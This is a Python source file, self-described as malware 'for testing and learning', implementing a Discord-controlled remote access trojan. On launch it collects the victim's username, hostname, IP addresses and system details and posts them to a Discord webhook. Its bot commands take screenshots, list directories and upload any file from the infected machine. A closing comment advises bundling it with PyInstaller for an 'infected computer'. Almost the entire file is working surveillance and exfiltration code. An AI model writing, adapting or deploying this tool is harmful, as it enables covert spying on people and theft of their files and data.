# VERY IMPORTANT
# THIS IS VERY CLEARLY MALWARE!!!
# DO NOT USE IT AS SUCH.
# THIS CODE IS ONLY FOR TESTING AND LEARNING!
# IF YOU INSTALL THIS ON SOMEONE ELSE’S MACHINE YOU WILL HAVE JUST COMMITTED:
# A FELONY
import os
import requests
import dotenv
import socket
import platform
import time
import datetime

debug = True
def debug_print(content):
    if debug == True:
        print(content)

dotenv.load_dotenv()

def discord_post(embed):
    url = os.getenv("URL")
    data = {
        "embeds": [embed] 
    }
    response = requests.post(url, json=data)
    debug_print(f"[Post] to {url}, {response.status_code}")

operating_system = platform.system()         # 'Windows', 'Linux', 'Darwin'
os_version = platform.release()               # '10', '11', '5.15.0-106'
cpu_architecture = platform.machine()         # 'x86_64', 'AMD64'
cpu_core_count = os.cpu_count()
current_user = os.getlogin()                  #ex. ben, admin
host_name = socket.gethostname()              #server1, cool-laptop
local_ip_address = socket.gethostbyname(host_name)
public_ip_address = requests.get('https://api.ipify.org').text
boot_timestamp = time.time()
boot_time_str = datetime.datetime.fromtimestamp(boot_timestamp).strftime("%Y-%m-%d %H:%M:%S")

if os.path.isdir("google_packet"):
    embed = {
        "title": f"System Boot - {host_name}",
        "color": 0x808080,
        "fields": [
            {"name": "Current User", "value": current_user, "inline": True},
            {"name": "Public IP", "value": public_ip_address, "inline": False},
            {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
            {"name": "Boot Time", "value": boot_time_str, "inline": False},
        ],
    }
else:
    embed = {
        "title": f"System Information - {host_name}",
        "color": 0x00ff00,
        "fields": [
            {"name": "Operating System", "value": operating_system, "inline": True},
            {"name": "OS Version", "value": os_version, "inline": True},
            {"name": "Current User", "value": current_user, "inline": True},
            {"name": "Host Name", "value": host_name, "inline": True},
            {"name": "Public IP", "value": public_ip_address, "inline": False},
            {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
            {"name": "CPU Architecture", "value": cpu_architecture, "inline": True},
            {"name": "CPU Core Count", "value": str(cpu_core_count), "inline": True},
        ],
    }

discord_post(embed)

try:
    os.makedirs("google_packet", exist_ok=True)
except Exception as e:
    debug_print(f"[Error] Failed to make dir: {e}")

import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
infected_ip = "123.123.0.12"

@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user}")

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! ({public_ip_address})")

@bot.command()
async def run(ctx):
    await ctx.send("Starting your process now!")

@bot.command()
async def kill(ctx):
    global infected_ip
    if infected_ip != public_ip_address:
        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
        return
    file_path = "./Downloads/main.exe"

    try:
        os.remove(file_path)
        print(f"{file_path} has been deleted.")
    except FileNotFoundError:
        print(f"{file_path} not found, nothing to delete.")
    except Exception as e:
        print(f"Error deleting {file_path}: {e}")

    await ctx.send(f"Killing script on {host_name}/{public_ip_address}")

import io

@bot.command()
async def screenshot(ctx):
    global infected_ip
    if infected_ip != public_ip_address:
        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
        return
    import pyautogui
    screenshot = pyautogui.screenshot()
    
    with io.BytesIO() as image_binary:
        screenshot.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))


@bot.command()
async def get_file(ctx, *, filepath: str):
    global infected_ip
    if infected_ip != public_ip_address:
        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
        return
    if not os.path.isfile(filepath):
        await ctx.send("File does not exist.")
        return
    try:
        await ctx.send(file=discord.File(fp=filepath))
    except Exception as e:
        await ctx.send(f"Failed to send file: {e}")

@bot.command()
async def list_files(ctx, *, dir: str):
    global infected_ip
    if infected_ip != public_ip_address:
        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
        return
    if dir:
        if os.path.isdir(dir):
            try:
                files = os.listdir(dir)
                files_str = "\n".join(files)
                if len(files_str) > 1900:
                    import io
                    with io.StringIO(files_str) as f:
                        await ctx.send(file=discord.File(fp=f, filename="files.txt"))
                else:
                    await ctx.send(f"Files in `{dir}`:\n```{files_str}```")
            except Exception as e:
                await ctx.send(f"Error reading directory: {e}")
        else:
            await ctx.send("Path to directory does not exist.")
    else:
        await ctx.send("Please send !list_files <filepath>")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge_channel(ctx, amount: int = 100):
    deleted = await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)

@bot.command()
async def infected_machine_ip(ctx, ip: str):
    import ipaddress
    global infected_ip
    try:
        ipaddress.ip_address(ip)
        infected_ip = ip
        await ctx.send(f"Infected machine IP set to: {infected_ip}")
    except ValueError:
        await ctx.send("❌ Invalid IP address.")


bot.run(os.getenv("BOT_TOKEN")) #USE AT YOUR OWN RISK!!!!!! YOU MAY NEED TO SETUP A SEPERATE SERVER TO AVOID EXPOSING YOUR TOKEN TO THE INFECTED COMPUTER. OTHERWISE PUT THE TOKEN THERE THEN PYINSTALLER IT!!!!!